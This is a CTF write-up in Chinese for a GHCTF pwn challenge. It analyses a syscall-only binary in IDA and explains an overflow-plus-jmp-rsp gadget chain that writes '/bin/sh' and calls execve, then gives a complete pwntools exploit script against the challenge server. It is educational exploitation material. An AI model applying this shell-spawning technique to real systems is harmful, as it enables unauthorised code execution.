---
title: GHCTF 你真的会布置栈吗？
sticky: 1
---
#  GHCTF 你真的会布置栈吗？

## ida分析

### _start函数分析 
![813b6b639a05fd8870ff80b5be117df7.png](https://img.picui.cn/free/2025/03/08/67cc554898165.png)
1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大
2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看

### print函数分析
![a36c17d8abe90bc1a9920db0595e982d.png](https://img.picui.cn/free/2025/03/08/67cc56bc5732f.png)
1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.


### gadgets 分析
1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.
2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.
3.同时，dispatch留有执行rbx中代码的功能.
4.下方还可以控制rdx，rsi，rdi 值为0.

## 构造思路
1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。
2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`"/bin/sh\x00"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。
3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。
4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell
5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。
6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。

## exp 

### 花里胡哨的rop
```python 
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node2.anna.nssctf.cn'
port=28634
elf=ELF("./attachment")
if mode == 0:
    io=process("./attachment")
else :
    io=remote(url,port)

sys_call=0x401077
rax_r13=0x40100c
data=0x402000
gadget_pop=0x401017
dispatcher=0x401011
xor_rsi=0x401027
Free_Gate=0x40101c
xor_rdx=0x401021

payload=p64(gadget_pop)
payload+=p64(0)*3
payload+=p64(gadget_pop) #r15
payload+=p64(data) #rsi ,rsp
payload+=p64(0)*3 #rdi,rbx,r13
payload+=p64(rax_r13) #r15 
payload+=p64(Free_Gate)
payload+=p64(sys_call) #r15   read

payload+=p64(gadget_pop)# rsp,rsi
payload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13
payload+=p64(gadget_pop)# r15
payload+=p64(0) # rsp,rsi
payload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13
payload+=p64(dispatcher)#r15
payload+=p64(sys_call)

io.send(payload)
payload=b'/bin/sh\x00'
payload+=p64(xor_rdx)+p64(rax_r13)
#gdb.attach(io)
io.send(payload)


io.interactive()
```